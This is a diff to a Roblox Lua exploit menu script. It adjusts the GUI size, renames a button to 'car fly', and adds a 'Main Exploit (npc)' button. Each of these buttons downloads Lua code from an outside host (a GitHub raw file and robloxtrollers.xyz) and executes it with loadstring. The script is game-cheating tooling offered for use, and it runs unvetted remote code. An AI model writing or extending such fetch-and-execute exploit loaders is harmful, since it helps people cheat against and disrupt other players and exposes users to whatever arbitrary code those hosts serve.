@@ -17,7 +17,7 @@ gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 -- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 400, 0, 250) -- Adjusted size to fit all buttons
+mainFrame.Size = UDim2.new(0, 400, 0, 300) -- Adjusted size to fit all buttons
 mainFrame.Position = UDim2.new(0.5, -200, 0.5, -325)
 mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 mainFrame.BorderSizePixel = 0
@@ -85,7 +85,7 @@ local function createButton(name, scriptFunc, position)
     button.MouseButton1Click:Connect(scriptFunc)
 end
 
-createButton("x64 bypass", function()
+createButton("car fly", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/rosploiter/scripts/refs/heads/main/lancet.lua",true))()
 end, 50)
 
@@ -207,6 +207,10 @@ end
 end)
 end
 end, 150)
+
+createButton("Main Exploit (npc)", function()
+    loadstring(game:HttpGet('https://robloxtrollers.xyz/loadstring/npc.lua'))()
+end, 200)
 
 -- Hide Button
 local hideButton = Instance.new("TextButton")
